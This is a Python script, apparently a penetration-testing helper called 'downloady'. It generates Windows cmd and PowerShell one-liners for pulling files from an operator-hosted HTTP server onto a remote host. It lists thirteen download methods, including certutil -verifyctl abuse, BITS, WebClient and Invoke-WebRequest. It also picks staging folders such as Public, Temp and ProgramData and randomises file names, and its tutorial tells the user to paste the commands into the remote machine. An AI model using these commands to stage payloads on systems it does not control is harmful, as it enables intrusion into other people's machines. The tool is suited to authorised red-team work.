import random, string, datetime, argparse, os

INTDEFAULTLENGTHOFFILENAME = 6
LINEBREAKER = "\n\n\n----------------------------------------\n"

def readFile(strFilepath: str) -> str:
    if issubclass(type(strFilepath),str) != True : return None
    strReturn = ""
    with open(strFilepath, "r") as objOpenFile:
        strReturn = objOpenFile.read()
    return strReturn

def writeFile(strFilepath: str, strContent: str):
    with open(strFilepath, "a") as objOpenFile: objOpenFile.write(strContent)

def randomString(intLength: int=4) -> str:
    strASCII = string.ascii_lowercase
    return ''.join(random.choice(strASCII) for i in range(intLength))

TOTALDOWNLOADMETHODS = 13
def downloadMethod(strMethod: str="certutil", strSource: str="", strDownloadFilepath: str="") -> list:
    if "" in [strMethod, strSource, strDownloadFilepath]: return []
    strMethod = strMethod.lower()
    arrReturn = []
    if strMethod in ['1', 'certutil', 'certutil.exe', 'wlol', 'cmd', 'all']: arrReturn.append(f'certutil.exe -verifyctl -f -split "{strSource}" "{strDownloadFilepath}"')
    if strMethod in ['2', 'invoke-webrequest', 'webrequest', 'wlol', 'ps', 'all']: arrReturn.append(f'Invoke-WebRequest -Uri "{strSource}" -OutFile "{strDownloadFilepath}"')
    if strMethod in ['3', 'webclient', 'system.net.webclient', 'wlol', 'ps', 'all']: arrReturn.append(f'$webClient = New-Object System.Net.WebClient; $webClient.DownloadFile("{strSource}", "{strDownloadFilepath}")')
    if strMethod in ['4', 'curl', 'curl.exe', 'wlol', 'cmd', 'all']: arrReturn.append( f'curl -o "{strDownloadFilepath}" "{strSource}"')
    if strMethod in ['5', 'bits', 'start-bitstransfer', 'wlol', 'ps', 'all']: arrReturn.append(f'Start-BitsTransfer -Source  "{strSource}" -Destination "{strDownloadFilepath}"')
    if strMethod in ['6', 'httpclient', 'system.net.http.httpclient', 'wlol', 'ps', 'all']: arrReturn.append(f'$httpClient = New-Object System.Net.Http.HttpClient; $response = $httpClient.GetAsync("{strSource}").Result; $response.Content.ReadAsByteArrayAsync().Result | Set-Content -Path "{strDownloadFilepath}"-Encoding Byte')
    if strMethod in ['7', 'restmethod', 'invoke-restmethod', 'wlol', 'ps', 'all']: arrReturn.append(f'Invoke-RestMethod -Uri "{strSource}" -OutFile "{strDownloadFilepath}"')
    if strMethod in ['8', 'httpwebrequest', 'system.net.httpwebrequest', 'wlol', 'ps', 'all']: arrReturn.append(f'$request = [System.Net.HttpWebRequest]::Create("{strSource}"); $response = $request.GetResponse(); $stream = $response.GetResponseStream(); $reader = New-Object System.IO.StreamReader -ArgumentList $stream; Set-Content -Path "{strDownloadFilepath}" -Value $reader.ReadToEnd() -Encoding Byte; $reader.Close(); $stream.Close(); $response.Close()')
    if strMethod in ['9', 'psftp', 'system.net.networkcredential', 'ftp', 'wlol', 'all']: arrReturn.append(f'$webClient = New-Object System.Net.WebClient; $webClient.Credentials = New-Object System.Net.NetworkCredential(\'ftpUsernameOrAnonymousLol\', \'ftpPasswordOrRemoveThisValueWithThe,\'); $webClient.DownloadFile("{strSource}", "{strDownloadFilepath}")')
    if strMethod in ['10', 'aws', 'system.net.networkcredential', 'ps', 'all']: arrReturn.append(f'Install-Module -Name AWSPowerShell -Scope CurrentUser; $bucketName = "replace-this-with-your-s3-bucket"; Import-Module AWSPowerShell; Read-S3Object -BucketName $bucketName -Key "{strDownloadFilepath}" -File "{strSource}"')
    if strMethod in ['11', 'psbackground', 'receive-job', 'ps', 'all']: arrReturn.append(f'Receive-Job -Job Start-Job -ScriptBlock {{Invoke-WebRequest -Uri "{strSource}" -OutFile "{strDownloadFilepath}"}} -Wait')
    if strMethod in ['12', 'psstrem', 'invoke-webrequest', 'ps', 'wlol', 'all']: arrReturn.append(f'$response = Invoke-WebRequest -Uri "{strSource}" -Method Get -PassThru;$stream = $response.RawContentStream; $fs = New-Object IO.FileStream "{strDownloadFilepath}", "Create";$buffer = New-Object byte[] 8192; while (($read = $stream.Read($buffer, 0, $buffer.Length)) -gt 0) {{$fs.Write($buffer, 0, $read)}}; $fs.Close(); $stream.Close()')
    if strMethod in ['13', 'dloader', 'dloader.exe', 'cmd', 'all']: arrReturn.append(f'dloader.exe "{strSource}" "{strDownloadFilepath}"')
    return arrReturn


def pickDestinationFolder(strFolder: str="all", strFilename: str="") -> list:
    if strFolder == "": strFolder = "all"
    if strFilename == "": randomString(INTDEFAULTLENGTHOFFILENAME)
    strFolder = strFolder.lower()
    arrReturn = []
    if strFolder in ['cmddocuments', 'documents', 'cmd', 'all']: arrReturn.append(f'C:\\Users\\%USERNAME%\\Documents\\{strFilename}')
    if strFolder in ['psdocuments', 'documents', 'ps', 'all']: arrReturn.append(f'C:\\Users\\$env:USERNAME\\Documents\\{strFilename}"')
    if strFolder in ['cmddownloads', 'downloads', 'cmd', 'all']: arrReturn.append(f'C:\\Users\\%USERNAME%\\Downloads\\"')
    if strFolder in ['psdownloads', 'downloads', 'ps', 'all']: arrReturn.append(f'C:\\Users\\$env:USERNAME\\Downloads\\{strFilename}"')
    if strFolder in ['public', 'all']: arrReturn.append(f'C:\\Users\\Public\\{strFilename}')
    if strFolder in ['temp', 'all']: arrReturn.append(f'C:\\Temp\\{strFilename}')
    if strFolder in ['programdata', 'all']: arrReturn.append(f'C:\\ProgramData\\{strFilename}')
    if arrReturn == []: arrReturn.append(strFolder)
    return arrReturn





def makeFilename(strSource: str, intLength: int=INTDEFAULTLENGTHOFFILENAME) -> str:
    if intLength < 1: intLength = 1
    strFilename = strSource.split("/")[-1]
    strExtension = ""
    if "." in strFilename: 
        strExtension = "." + strFilename.split(".")[-1]
        strFilename = strFilename[:(-1*len(strExtension))]
    if len(strFilename) < intLength: 
        strFilename = randomString(intLength - len(strFilename)) + strFilename

    elif len(strFilename) > intLength:
        while len(strFilename) != intLength:
            intRandom = random.randint(0,len(strFilename)-1)
            strFilename = strFilename[:intRandom] + strFilename[intRandom+1:]
    strReturn = (strFilename + strExtension)
    arrBadChars = ['-', " ", "'", "(", ")"]
    for strChar in arrBadChars:
        if strChar in strReturn:
            strReturn = strReturn.replace(strChar, randomString(1))
    return strReturn.lower()

def fixDownloadLink(strSource: str, strFilename: str="") -> str:
    if strSource == strFilename or strFilename == "": return strSource 
    strReturn = strSource
    if strSource[:7] != "http://" and strSource[:8] != "https://" and strSource[:6] != "ftp://": strReturn = "http://"+ strSource
    if strSource[-1] != "/": strReturn += "/"
    strReturn += strFilename
    

    return strReturn

def strNow():
    dtNow = datetime.datetime.now()
    return dtNow.strftime('%Y%m%d_%H%M%S')


def testAll(strHostedRootDir) -> list:
    arrReturn = []
    strCurrentDirectory = os.path.abspath(os.getcwd())
    strTestDir = os.path.join(strCurrentDirectory, "testAll_Output/")
    if os.path.exists(strTestDir) != True: os.system(f"mkdir {strTestDir}")
    for i in range(1,TOTALDOWNLOADMETHODS+1):
        strFilename = str(i) + ".test"
        strTestFilePath = os.path.join(strTestDir, strFilename)
        os.system("echo " + str(random.randint(0,999_999_999)) + f" > '{strTestFilePath}'")
        arrDesinations = pickDestinationFolder("all")
        for strDestination in arrDesinations: 
            arrReturn.append(downloadMethod(str(i), fixDownloadLink(strHostedRootDir, strFilename), strDestination + strFilename)[0])
    print(LINEBREAKER)
    print(f"Test files have been saved to: {strTestDir}, please share the files from there.")
    print(f"Example command:\ncd '{strTestDir}'; python3 -m http.server 4040\n")
    print("Please save as file by selecting Y on the save option.\n")
    return arrReturn


def generateList(strMethod: str, strHostedRootDir: str, strDestinationFolder: str, strFileWithFilenames: str="") -> list:
    if strMethod == "testAll": 
        return testAll(strHostedRootDir)
    elif strFileWithFilenames != "":     
        arrFiles = readFile(strFileWithFilenames).split()
        while [] in arrFiles: arrFiles.remove([])
    else: arrFiles = [strHostedRootDir]
    arrReturn =[]
    for strLocalFilename in arrFiles:
        strDownloadLink = fixDownloadLink(strHostedRootDir, strLocalFilename)
        strRemoteFilename = makeFilename(strLocalFilename)

        for strFolder in pickDestinationFolder(strDestinationFolder):
            if strFolder[-1] == '"': strRemoteFilePath = strFolder[:-1]+strRemoteFilename + '"'
            else: strRemoteFilePath = strFolder+strRemoteFilename
            for strOutput in downloadMethod(strMethod, strDownloadLink, strRemoteFilePath):
                arrReturn.append(strOutput)
                print(f"""\tLocal Filename: {strLocalFilename} -> Remote Filename: {strRemoteFilename}\n\tDownload URL: {strDownloadLink} \tOutput to: {strRemoteFilePath}""")
                print(strOutput+"\n")
    return arrReturn


def confirmWrite(arrList):
    print(LINEBREAKER)
    strOutputFilename = f"downloady_{strNow()}.txt"
    strUserInput = input(f"Save as '{strOutputFilename}'? (Y/n)\t").lower()
    
    if strUserInput in ["", "y"]: 
        for strOutput in arrList:
            writeFile(strOutputFilename, strOutput + "\n")
        print("File has been saved successfuly.")

def showLogo():
    strLogo = ("""
         _                     _                 _       
      __| | _____      ___ __ | | ___   __ _  __| |_   _ 
     / _` |/ _ \\ \\ /\\ / / '_ \\| |/ _ \\ / _` |/ _` | | | |
    | (_| | (_) \\ V  V /| | | | | (_) | (_| | (_| | |_| |
     \\__,_|\\___/ \\_/\\_/ |_| |_|_|\\___/ \\__,_|\\__,_|\\__, |
                                                   |___/ 
            -by i-vt
            
            https://github.com/i-vt/
            """)
    print(strLogo)

def showTutorial():
    strTutorial = """
Usage:

1. Find your private IP (for this example it will be 10.1.1.1)
2. Start the http.server in the same directory as other files (python3 -m http.server 4040)
3. Find out your private IP using ipconfig, then format it as such: http://10.1.1.1:4040/
4. Paste the command generated by downloady into the remote host & check to see if you got the file downloaded

\tExample commands:
\tpython3 downloady.py webrequest http://10.1.1.1/file.txt documents
\tpython3 downloady.py all http://10.1.1.1:4040/ all -f files.txt
\tpython3 downloady.py lolw http://10.1.1.1/ ps -f files.txt
\tpython3 downloady.py testall http://10.1.1.1:4040/ testall
\t\t(Check downloadMethod & pickDestinationFolder function within the code for more options available)
    """
    print( strTutorial)

if __name__ == "__main__":
    showLogo()
    showTutorial()
    parser = argparse.ArgumentParser(description="[downloady] main description: ")
    
    showTutorial
    parser.add_argument("method", help="Method used for downloading such as ex.: certutil, webrequest, webclient, curl, bits, httpclient, dloader, all, cmd, ps, wlol, and etc.")
    parser.add_argument("url", help="If no file with filenames is used (-f key), then ex.: http://10.1.1.1/file.pdf\nIf file list is specified, then use: http://10.1.1.1/")
    parser.add_argument("destination", help="Destination folder location, ex: psdocument, psdownloads, pspublic, cmddocument, cmddownloads, public, temp, programdata, or custom entry")
    parser.add_argument("-f", "--file", type=str,
                        help="A file that contains multiple filenames (of files located in the same directory as the script) that need to be uploaded ")

    objArguments = parser.parse_args()
    strSubjectFilepath = str(objArguments.file)
    if objArguments.file == None:
        strFile = ""
    else:
        strFile = objArguments.file
    arrOutputStrings = generateList(objArguments.method, objArguments.url, objArguments.destination, strFile)
    confirmWrite(arrOutputStrings)
